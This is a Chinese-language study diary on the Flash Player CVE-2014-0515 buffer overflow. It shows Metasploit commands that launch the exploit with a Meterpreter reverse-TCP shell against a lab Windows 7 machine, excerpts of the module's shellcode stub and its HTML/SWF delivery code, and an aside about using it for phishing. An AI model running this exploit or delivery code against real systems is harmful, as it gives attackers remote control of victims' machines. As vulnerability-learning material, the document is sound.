# CVE 2014-0515 渣渣学习笔记

## 主要报告
[CVE 通用漏洞与披露](http://www.scap.org.cn/CVE-2014-0515.html)
[CVE 官网](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0515)
[类似漏洞概况](http://www.cvedetails.com/cve/CVE-2014-0515/)

## 概况
Buffer overflow in Adobe Flash Player before 11.7.700.279 and 11.8.x through 13.0.x before 13.0.0.206 on Windows and OS X, and before 11.2.202.356 on Linux, allows remote attackers to execute arbitrary code via unspecified vectors, as exploited in the wild in April 2014.<br>


## 演示验证
[Japanese youtube](https://www.youtube.com/watch?v=mNApA4ubsbo)
https://www.rapid7.com/db/modules/exploit/multi/browser/adobe_flash_pixel_bender_bof

### shell
一番折腾之后选择了win7 sp1 32bit进行msf测试。<br>
kali linux进行测试验证，插件是flash_player_activex_13.0.0.182<br>
```
msf > use exploit/multi/browser/adobe_flash_pixel_bender_bof
msf exploit(adobe_flash_pixel_bender_bof) > set SRVHOST 192.168.50.132
msf exploit(adobe_flash_pixel_bender_bof) > set LHOST 192.168.50.132
msf exploit(adobe_flash_pixel_bender_bof) > set SRVPORT 80
msf exploit(adobe_flash_pixel_bender_bof) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(adobe_flash_pixel_bender_bof) > set SRVPATH /
msf exploit(adobe_flash_pixel_bender_bof) > exploit
```
其中192.168.50.132是本本机端口<br>
最后 生成 http://192.168.50.132:8080/S40YtnhUGivc9<br>
ie中输入这个网站，sessions -i 1 拿shell<br>
就渗透进去了(用来钓鱼那真是。。。)<br>

## 向大佬询问方法
看一些已经有的方法，flash过于复杂，先看一些典型的进行调试分析，没有捷径，只能慢慢来

## 找资料&分析poc
poc采用ruby语言
### 报告阅读(太概括了)
- [heap spraying](https://securelist.com/blog/incidents/59399/new-flash-player-0-day-cve-2014-0515-used-in-watering-hole-attacks/
    提到 movie.swf 和 include.swf 这两个exp样本，两个是在shellcode方面不同，其他类似<br>
    - 准备
        使用heap spray(简单的来说就是在堆栈上覆盖一大片的空指令如NOP)<br>
    - exploit
        1. 采用VirtualProtect改写段的读写权限<br>
        2. VirtualAlloc分配空间并把第二段shellcode拷贝到里面<br>
        3. 是搜索库函数，但是延迟大<br>
           另外一种是到了这里就查找flash10p.ocx的base address，但是需要Adobe Flash Player ActiveX and Cisco MPE才行，但是文中交待并没有明确的payload来分析，因为没有进行重放(为啥)
    - summary<br>
        We detect such exploits by AEP technology as PDM:Exploit.Win32.Generic and by heuristics as HEUR:Exploit.SWF.CVE-2014-0515.gen
    - got<br>
        无

- https://vuldb.com/?id.13085 none
- [较为详细的概括](http://cwe.mitre.org/data/definitions/119.html)
### day1 真是什么都没有摸索到

## 摸索

### 抓包
这个真是。。。抓了一个晚上包，找到swf，然后各种工具配置分析格式。。。。

### 分析msf
#### 初始化
```
'Space' => 2000,
'DisableNops' => true,
'PrependEncoder' => stack_adjust

def stack_adjust
    adjust = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18] # get teb
    adjust << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    adjust << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    adjust << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
    adjust
end
```
这里主要配置了payload的一些格式，去除了NOP指令，而采用 stack_adjust 来填充<br>
>Thread Environment Block (TEB)<br>
>由TEB结构/*0x008*/ PVOID ImageBaseAddress;<br>

接下来on_request_exploit 就是主要的了，等待访问网页，然后发送已经构造好的.swf和html<br>
html主要用来触发网页请求获取swf。<br>

### 构造html和发送swf
```
def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    flash_payload = ""
    get_payload(cli,target_info).unpack("V*").each do |i|
      flash_payload << "0x#{i.to_s(16)},"
    end
    flash_payload.gsub!(/,$/, "")


    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=flash_payload%>" />
    <param name="Play" value="true" />
    </object>
    </body>
    </html>
    |
    return html_template, binding()
end
```
这个就是构造html
```
if request.uri =~ /\.swf$/
    print_status("Sending SWF...")
    send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})
    return
end
```
这个就是发生构造的swf payload<br>
其中也看出了利用的swf是在/usr/share/metasploit-framework/data/exploits/之中(kali linux中)<br>

### Summary of day2
漏洞依旧没有进展，不过学习了很多，下一步仔细分析swf文件，这个msf shellcode里感觉好像找不到明显的漏洞点..完全没有经验的来搞真是曲折啊。。看来是要速看点flash漏洞分析的了。。<br>

## Reference
  http://cvedetails.com/cve/2014-0515/
  http://www.securityfocus.com/bid/67092
  http://helpx.adobe.com/security/products/flash-player/apsb14-13.html
  http://www.securelist.com/en/blog/8212/New_Flash_Player_0_day_CVE_2014_0515_used_in_watering_hole_attacks
  http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2014-0515-the-recent-flash-zero-day/




